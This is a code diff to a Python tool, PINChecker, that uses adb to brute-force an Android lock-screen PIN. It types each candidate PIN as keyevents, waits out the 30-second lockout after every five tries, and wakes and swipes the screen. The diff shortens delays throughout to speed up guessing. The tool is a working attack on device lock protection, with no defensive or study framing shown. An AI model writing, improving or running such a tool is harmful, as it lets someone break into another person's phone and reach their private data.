@@ -141,18 +141,14 @@ class PINChecker:
             self.log(f"Error during initial unlock: {e}", style="red")
             return False
 
-    def enter_pin(self, pin):
+    def wake_screen(self):
+        """Wake up the device screen"""
         try:
-            # Enter all digits faster
-            for digit in pin:
-                keycode = str(int(digit) + 7)
-                run(['adb', 'shell', 'input', 'keyevent', keycode], check=True)
-                time.sleep(0.05)  # Reduced from 0.1 to 0.05
-            run(['adb', 'shell', 'input', 'keyevent', '66'], check=True)
-            time.sleep(0.3)  # Reduced from 0.5 to 0.3
+            run(['adb', 'shell', 'input', 'keyevent', '26'], check=True)
+            time.sleep(0.2)  # Reduced from 1 to 0.2
             return True
         except CalledProcessError as e:
-            self.log(f"Error entering PIN: {e}", style="red")
+            self.log(f"Error waking screen: {e}", style="red")
             return False
 
     def swipe_up(self):
@@ -165,11 +161,25 @@ class PINChecker:
             end_y = int(height * 0.2)
             
             run(['adb', 'shell', 'input', 'swipe', 
-                str(start_x), str(start_y), str(end_x), str(end_y), '50'], check=True)
-            time.sleep(0.5)
+                str(start_x), str(start_y), str(end_x), str(end_y), '30'], check=True)  # Reduced from 50 to 30
+            time.sleep(0.2)  # Reduced from 0.5 to 0.2
             return True
         except CalledProcessError as e:
             self.log(f"Error during swipe: {e}", style="red")
+            return False
+
+    def enter_pin(self, pin):
+        try:
+            # Enter all digits faster without waking screen
+            for digit in pin:
+                keycode = str(int(digit) + 7)
+                run(['adb', 'shell', 'input', 'keyevent', keycode], check=True)
+                time.sleep(0.02)  # Reduced from 0.05 to 0.02
+            run(['adb', 'shell', 'input', 'keyevent', '66'], check=True)
+            time.sleep(0.2)  # Reduced from 0.3 to 0.2
+            return True
+        except CalledProcessError as e:
+            self.log(f"Error entering PIN: {e}", style="red")
             return False
 
     def check_if_unlocked(self):
@@ -237,8 +247,9 @@ class PINChecker:
         sys.stdout.write("\rResuming PIN attempts...                 \n")
         sys.stdout.flush()
         
-        # Perform swipe up after timeout
-        self.log("Performing screen swipe...", style="blue")
+        # Wake screen and swipe up after timeout
+        self.log("Waking screen and performing swipe...", style="blue")
+        self.wake_screen()
         self.swipe_up()
 
     def check_all_pins(self):
@@ -255,6 +266,9 @@ class PINChecker:
 
         self.start_time = datetime.now()
         
+        # Wake screen and perform initial unlock
+        self.log("Waking screen and performing initial unlock...", style="blue")
+        self.wake_screen()
         if not self.initial_unlock():
             self.log("Failed to perform initial unlock sequence", style="red")
             return
@@ -269,7 +283,7 @@ class PINChecker:
                 BarColumn(),
                 TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                 TimeElapsedColumn(),
-                refresh_per_second=1  # Reduce refresh rate
+                refresh_per_second=1
             ) as progress:
                 task = progress.add_task("Testing PINs...", total=total_pins)
                 
@@ -279,7 +293,7 @@ class PINChecker:
                     
                     if not self.enter_pin(formatted_pin):
                         self.log(f"Failed to enter PIN: {formatted_pin}", style="red")
-                        time.sleep(0.5)  # Reduced from 1 to 0.5
+                        time.sleep(0.2)
                         continue
                     
                     current_attempt += 1
@@ -296,13 +310,16 @@ class PINChecker:
                     
                     # Pause every 5 attempts
                     if current_attempt % 5 == 0:
-                        # Clear the progress bar temporarily
                         progress.stop()
                         self.wait_with_countdown(30)
+                        # Wake screen and swipe after timeout
+                        self.log("Waking screen and performing swipe...", style="blue")
+                        self.wake_screen()
+                        self.swipe_up()
                         progress.start()
                     
                     progress.update(task, advance=1)
-                    time.sleep(0.05)  # Reduced from 0.1 to 0.05
+                    time.sleep(0.02)
             
             # Show final results
             elapsed_time = datetime.now() - self.start_time
